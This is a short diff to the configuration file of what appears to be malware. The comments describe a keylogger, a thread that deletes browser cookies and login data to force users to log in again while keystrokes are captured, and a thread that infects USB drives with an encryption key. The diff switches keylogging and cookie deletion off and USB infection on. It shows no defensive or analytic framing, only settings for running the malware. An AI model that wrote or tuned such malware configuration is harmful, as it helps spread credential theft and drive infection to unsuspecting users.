@@ -42,13 +42,13 @@ const USE_SCREENSHOT_THREAD*: bool = false
 
 ## keyloggerThread is used for logging key presses
 ## DEFAULT: true
-const USE_KEYLOGGER_THREAD*: bool = true
+const USE_KEYLOGGER_THREAD*: bool = false
 
 ## browserThread is used for deleting cookies and login data
 ## so the user is forced to login back again
 ## best used alongside keyloggerThread
 ## DEFAULT: true
-const USE_BROWSER_THREAD*: bool = true
+const USE_BROWSER_THREAD*: bool = false
 
 ## when `true` the program will remove files
 ## instead of renaming them
@@ -58,7 +58,7 @@ const UNSAFE_REMOVE_FILE*: bool = false
 
 ## infectThread is used for searching usb drives and infecting them
 ## DEFAULT: true
-const USE_INFECT_THREAD*: bool = false
+const USE_INFECT_THREAD*: bool = true
 
 ## the key files on a usb drive will be infected with
 ## YOU MUST add e before " to encrypt the key so it can't be read
